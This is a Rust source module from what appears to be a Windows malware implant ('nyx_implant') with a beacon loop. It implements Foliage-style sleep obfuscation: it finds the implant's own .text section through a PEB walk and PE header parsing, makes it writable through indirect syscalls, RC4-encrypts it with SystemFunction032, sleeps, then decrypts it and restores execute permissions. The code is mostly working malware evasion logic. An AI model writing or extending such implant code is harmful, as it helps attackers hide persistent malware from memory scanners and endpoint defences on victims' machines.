//! Sleep obfuscation — Foliage syscall executor (P2.1a-iii).
//!
//! ## Status (after this task): Foliage executor skeleton is REAL but GATED OFF.
//! The pure state-machine math (step ordering, RC4 round-trip) lives in
//! `nyx_implant_evasionsdk::foliage` (host-tested, 5 tests). This module maps
//! each `FoliageStep` to its indirect syscall, driving the live thread through
//! the mask→sleep→unmask cycle.
//!
//! ## Gating
//! `FOLIAGE_ENABLED` defaults OFF — the beacon loop's sleep still routes through
//! `NoMask` (plain indirect-syscall NtDelayExecution) unless an operator arms
//! this. The real APC chain (NtQueueApcThread + NtContinue) manipulates the
//! thread CONTEXT + flips .text RX→RW; landing it blind (no target debugger)
//! risks a crash with no way to bisect. Arm only after target-side validation.

#![cfg(target_os = "windows")]

use core::sync::atomic::{AtomicBool, Ordering};
use nyx_implant_evasionsdk::foliage::{self, FoliagePlan, FoliageStep};

/// Master switch for the Foliage sleep mask. **Defaults OFF** — see module docs.
/// Arm from a selftest/operator command after target-side validation.
static FOLIAGE_ENABLED: AtomicBool = AtomicBool::new(false);

/// Arm/disarm the Foliage sleep mask.
pub fn set_foliage_enabled(on: bool) {
    FOLIAGE_ENABLED.store(on, Ordering::Release);
}

/// Whether the Foliage sleep mask is currently armed.
pub fn foliage_enabled() -> bool {
    FOLIAGE_ENABLED.load(Ordering::Acquire)
}

/// Sleep `seconds` with sleep-mask obfuscation.
///
/// **With [`foliage_enabled`] OFF (default)**: delegates to the sleepmask kit
/// (`NoMask` → plain indirect-syscall NtDelayExecution). Byte-identical to the
/// pre-Foliage behavior.
///
/// **With [`foliage_enabled`] ON**: builds a `FoliagePlan` and masks the implant
/// `.text` via SystemFunction032 RC4, sleeps, then unmasks. Synchronous skeleton
/// (the APC/NtContinue async context dance is a refinement that needs target
/// debug). Safe because the beacon thread sleeps through the encrypted window.
pub fn sleep(seconds: u32) {
    if !foliage_enabled() {
        // Default: NoMask kit → plain indirect-syscall sleep.
        crate::kits::sleep(seconds);
        return;
    }
    // ---- ARMED PATH (gated) ------------------------------------------------
    let region = match unsafe { own_text_region() } {
        Some(r) => r,
        None => {
            crate::kits::sleep(seconds); // degrade: can't resolve .text
            return;
        }
    };
    let key = mask_key_16();
    let plan = FoliagePlan::build(region.base, region.len, seconds, None, key);
    execute_foliage_plan(&plan);
}

struct TextRegion {
    base: usize,
    len: usize,
}

/// The implant's own `.text` region (base + len), resolved via the PEB walk.
/// None if the image base can't be resolved (degrade to NoMask).
///
/// # Safety
/// PEB walk reads loader state stable post-load; safe in single-threaded context.
unsafe fn own_text_region() -> Option<TextRegion> {
    let base_ptr = crate::resolve::module_base_by_name(b"nyx_implant_win.dll")
        .or_else(|| crate::resolve::module_base_by_name(b"nyx_implant_win.0.1.0.dll"))?;
    let base = base_ptr as usize;
    let (text_rva, text_size) = unsafe { section_va_len(base, b".text")? };
    Some(TextRegion { base: base + text_rva, len: text_size })
}

/// Find a PE section's (virtual_address, virtual_size) by name. Returns None
/// if the PE headers can't be parsed or the section isn't found.
unsafe fn section_va_len(base: usize, name: &[u8]) -> Option<(usize, usize)> {
    let dos = unsafe { &*(base as *const [u8; 64]) };
    if dos[0] != b'M' || dos[1] != b'Z' {
        return None;
    }
    let e_lfanew = i32::from_le_bytes([dos[60], dos[61], dos[62], dos[63]]) as usize;
    // IMAGE_NT_HEADERS64: Signature(4) + IMAGE_FILE_HEADER(20) + IMAGE_OPTIONAL_HEADER64
    // FileHeader fields: NumberOfSections @ +6 (u16), SizeOfOptionalHeader @ +20 (u16).
    let nt = unsafe { &*((base + e_lfanew) as *const [u8; 24]) };
    if !(nt[0] == b'P' && nt[1] == b'E') {
        return None; // bad PE signature
    }
    let num_sections = u16::from_le_bytes([nt[6], nt[7]]) as usize;
    let size_opt_hdr = u16::from_le_bytes([nt[20], nt[21]]) as usize;
    let sections_off = e_lfanew + 24 + size_opt_hdr;
    for i in 0..num_sections {
        // IMAGE_SECTION_HEADER: Name[8] + VirtualSize(4) + VirtualAddress(4) + ...
        let sec = unsafe { &*((base + sections_off + i * 40) as *const [u8; 40]) };
        // Name is 8 bytes, null-padded. Compare up to name.len().
        let name_len = name.iter().position(|&b| b == 0).unwrap_or(name.len());
        if sec[..name_len] == name[..name_len] {
            let vsize = u32::from_le_bytes([sec[8], sec[9], sec[10], sec[11]]) as usize;
            let vaddr = u32::from_le_bytes([sec[12], sec[13], sec[14], sec[15]]) as usize;
            return Some((vaddr, vsize));
        }
    }
    None
}

/// Derive a 16-byte RC4 key (matches SystemFunction032's USTRING convention).
/// Per-boot diversity from the syscall runtime's SSN table.
fn mask_key_16() -> [u8; 16] {
    let seed: u32 = crate::syscalls::global()
        .and_then(|rt| rt.ssn_by_hash(crate::resolve::djb2(b"ntdelayexecution")))
        .unwrap_or(0x1234_5678);
    let mut key = [0u8; 16];
    let mut s = seed;
    for b in key.iter_mut() {
        s = s.wrapping_mul(0x9E37_79B9).rotate_left(7).wrapping_add(0xA5A5_A5A5);
        *b = (s & 0xFF) as u8;
    }
    key
}

/// Walk the FoliagePlan, mapping each step to its syscall. Synchronous skeleton:
/// mask the region (protect RX→RW + RC4), sleep, unmask (RC4 + protect RW→RX).
fn execute_foliage_plan(plan: &FoliagePlan) {
    let rt = match crate::syscalls::global() {
        Some(rt) => rt,
        None => {
            crate::kits::sleep(plan_seconds(plan));
            return;
        }
    };
    // SAFETY: the region is the implant .text; we are NOT executing through it
    // during the sleep window (we're in this function's frame). Single-threaded.
    let region = unsafe {
        core::slice::from_raw_parts_mut(plan.region_base as *mut u8, plan.region_len)
    };
    // Steps 2-3: protect RX→RW + encrypt.
    let mut old: u32 = 0;
    let mut base = plan.region_base;
    let mut len = plan.region_len;
    let _ = unsafe {
        crate::syscalls::nt_protect_virtual_memory(
            rt, &mut base, &mut len, foliage::PAGE_READWRITE, &mut old,
        )
    };
    foliage::mask_region(&plan.key, region);
    // Steps 4-6: (skeleton skips context spoof) sleep via NtDelayExecution.
    let secs = plan_seconds(plan);
    let delay: i64 = -(secs as i64).saturating_mul(10_000_000);
    let _ = unsafe { crate::syscalls::nt_delay_execution(rt, 0, &delay as *const i64 as usize) };
    // Steps 7-9: decrypt + protect RW→RX.
    foliage::unmask_region(&plan.key, region);
    let _ = unsafe {
        crate::syscalls::nt_protect_virtual_memory(
            rt, &mut base, &mut len, foliage::PAGE_EXECUTE_READ, &mut old,
        )
    };
}

/// Extract the sleep seconds from the plan's Sleep step.
fn plan_seconds(plan: &FoliagePlan) -> u32 {
    plan.steps
        .iter()
        .find_map(|s| {
            if let FoliageStep::Sleep { seconds } = s {
                Some(*seconds)
            } else {
                None
            }
        })
        .unwrap_or(1)
}
